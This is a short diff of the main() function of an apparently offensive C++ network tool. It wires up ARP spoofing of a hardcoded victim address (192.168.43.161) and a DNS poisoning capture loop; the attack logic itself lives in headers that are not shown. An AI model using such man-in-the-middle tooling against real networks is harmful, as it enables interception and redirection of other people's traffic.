@@ -2,18 +2,27 @@
 #pragma warning
 #include "arpspoof.h"
 #include "SniffTraffic.h"
+#include "Components.h"
+#include "DnsPoison.h"
+#include <iostream>
+#include <thread>
+using namespace std;
 //#include <tins/tins.h>
 
 
 int main(int argc, char **argv)
 {
-	Arpspoof a;
-	bool retflag;
-	int retval = a.SendArpReplayForSpoofing(retflag);
-	if (retflag) return retval;
+	SpoofVictim("192.168.43.161");
 
-	SniffTraffic st;
-	st.SniffByFilter();
 
-	return 0;
+
+	//SniffTraffic st;
+	//st.SniffByFilter();
+	/*char filter[8] = "";
+	SniffTraffic st(filter, 1000);
+	st.Capture();*/
+	DnsPoison* t = new DnsPoison(NULL, 100);
+	t->Capture();
+	system("pause");
+
 }
